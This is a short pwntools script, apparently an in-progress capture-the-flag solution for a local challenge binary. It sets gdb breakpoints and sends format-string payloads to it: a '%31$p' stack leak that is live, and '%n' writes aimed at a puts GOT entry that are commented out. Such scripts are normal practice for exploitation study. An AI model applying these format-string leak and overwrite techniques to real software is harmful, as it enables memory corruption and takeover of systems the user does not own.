from pwn import *

def debug(r):
	gdb.attach(r,'''
	break * 0x0000555555554BFE
	break * 0x0000555555554B60
	break * 0x000555555554C88
	c
	''')	

context(os='linux', arch='amd64')
r=process("./pwn1_4bee342a05a1242e9aceaca77417d2ac")
debug(r)

#set  *((long *)0x7fffffffdd20)=0x0000555555756028
s="/AAAABBBB"+".%p"*30
puts_GOT=	0x55555575602b
#%9999d%32%n
print r.recvuntil(":")
r.sendline("*AAAAAAA%31$pBBBB")
#r.sendline('*\x60\x75\x55\x55\x55\x41\x41%1337d%10\$n')
#r.sendline(p64(puts_GOT)+"%10$p")
#r.sendline(s)
print r.recvuntil("Operand 1:")
r.sendline("A"*10)
print r.recvuntil("Operand 2:")
r.sendline("B"*10)
print r.recv(1024)
r.interactive()
r.close()
